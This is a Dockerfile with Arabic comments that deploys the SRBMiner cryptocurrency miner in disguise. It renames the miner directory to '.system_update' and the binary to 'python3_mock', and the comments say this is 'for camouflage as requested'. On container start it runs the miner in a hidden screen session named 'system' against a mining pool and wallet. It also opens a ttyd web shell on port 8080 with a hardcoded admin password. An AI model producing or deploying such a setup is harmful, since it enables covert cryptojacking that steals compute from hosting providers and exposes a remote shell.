# استخدام نسخة أوبونتو مستقرة لضمان تشغيل وموافقية المبرمج (SRBMiner)
FROM ubuntu:22.04

# منع الأسئلة التفاعلية أثناء التثبيت
ENV DEBIAN_FRONTEND=noninteractive

# تثبيت الأدوات والاعتماديات المطلوبة لفك ضغط الـ xz وتشغيل screen و ttyd
RUN apt-get update && apt-get install -y \
    wget \
    tar \
    xz-utils \
    screen \
    ttyd \
    ca-certificates \
    bash \
    && rm -rf /var/lib/apt/lists/*

# الانتقال للمجلد الرئيسي للمستخدم root
WORKDIR /root

# تنفيذ خطوات التحميل وفك الضغط وتغيير الأسماء للتمويه كما طلبت
RUN wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.4.7/SRBMiner-Multi-2-4-7-Linux.tar.xz && \
    tar -xf SRBMiner-Multi-2-4-7-Linux.tar.xz && \
    rm SRBMiner-Multi-2-4-7-Linux.tar.xz && \
    mv SRBMiner-Multi-2-4-7 .system_update && \
    cd .system_update && \
    mv SRBMiner-MULTI python3_mock

# إعداد متغيرات البيئة الخاصة بواجهة الويب وكلمة السر التي حددتها
ENV USERNAME=admin
ENV PASSWORD=mosap@123123
ENV PORT=8080

# إنشاء سكربت الإقلاع الذاتي (Entrypoint)
# هذا السكربت سيقوم بتشغيل التعدين داخل شاشة وهمية (screen) باسم system ثم يفتح واجهة الويب ttyd
RUN echo '#!/bin/bash\n\
cd /root/.system_update\n\
# تشغيل التعدين في الخلفية تحت اسم الملحق الوهمي وبإعداداتك\n\
screen -dmS system ./python3_mock --disable-gpu --algorithm verushash --pool eu.luckpool.net:3956 --wallet RL7rz7HqBMo2BuXwVJuQGKtgrDGYrwp76j.worker1 --password x --cpu-threads 1\n\
echo "التعدين بدأ بنجاح في الخلفية داخل جلسة screen باسم system"\n\
echo "لمشاهدة السجل الحي للتعدين، اكتب في الترمنال: screen -r system"\n\
# تشغيل واجهة الويب عبر المتصفح\n\
ttyd -p ${PORT} -c ${USERNAME}:${PASSWORD} bash\n\
' > /entrypoint.sh && chmod +x /entrypoint.sh

# تحديد السكربت ليعمل فور تشغيل الحاوية
ENTRYPOINT ["/entrypoint.sh"]
